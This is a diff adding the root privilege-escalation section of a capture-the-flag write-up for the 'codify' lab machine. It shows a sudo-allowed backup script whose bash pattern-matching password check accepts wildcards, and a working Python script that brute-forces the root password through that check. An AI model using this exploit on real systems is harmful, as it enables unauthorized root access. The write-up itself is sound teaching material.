@@ -177,3 +177,108 @@ Last login: Wed Mar  6 17:06:05 2024 from xx.xx.xx.xx
 joshua@codify:~$ cat user.txt 
 1e****************************94
 ```
+
+## Root privileges escalation and final flag
+
+Searching for scripts with `sudo -l` I've found a script called `mysql-backup.sh` used for making a database backup:
+
+```bash
+joshua@codify:~$ sudo -l
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+```
+
+The code of this script presents as follows:
+
+```bash
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+The script contains vulnerability in password handling method, which utilizes bash pattern comparison (double equals mark `==` in square brackets `[[ ]]`). This method compares the string to pattern, rather than string to string as it should be handled. Passing asterisk `*` as input:
+
+```bash
+joshua@codify:~$ /opt/scripts/mysql-backup.sh
+/usr/bin/cat: /root/.creds: Permission denied
+Enter MySQL password for root: 
+Password confirmed!
+Enter password: 
+```
+
+fullfils the pattern requirement and echoes the message of successful authentication. Threat actor can abuse this behavior by brute forcing the script, simply by using bash pattern mechanic - for example, if root password is `abcd1234` input of `a*`, `ab*` (and so on) will trigger the pattern.
+
+With this knowledge I've wrote simple Python script, which brute forces the password:
+
+```python
+import subprocess
+
+charset = [chr(i) for i in range(ord('a'), ord('z')+1)] + [chr(i) for i in range(ord('0'), ord('9')+1)]  # generate list of chars and digits
+target = '/opt/scripts/mysql-backup.sh'
+ACK = 'Password confirmed!'
+
+def check(pswd):
+    cmd = f'echo {pswd}* | sudo {target}'
+    feedback = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+    if ACK in feedback:  # check if feedback contains keywords
+        return True
+    else:
+        return False
+
+password = str()
+
+while True:
+    for char in charset:
+        if check(password + char):  
+            password += char
+            break
+    else:
+        print(f'password: {password}')
+        break
+```
+
+executing the exploit, we get the root password
+
+```bash
+joshua@codify:~$ python3 exploit.py
+password: kljh*************kjh3
+```
+
+which we can use to login into root and read root flag:
+
+```bash
+joshua@codify:~$ su - root
+Password: 
+root@codify:~# cat /root/root.txt 
+edba************************de60
+```
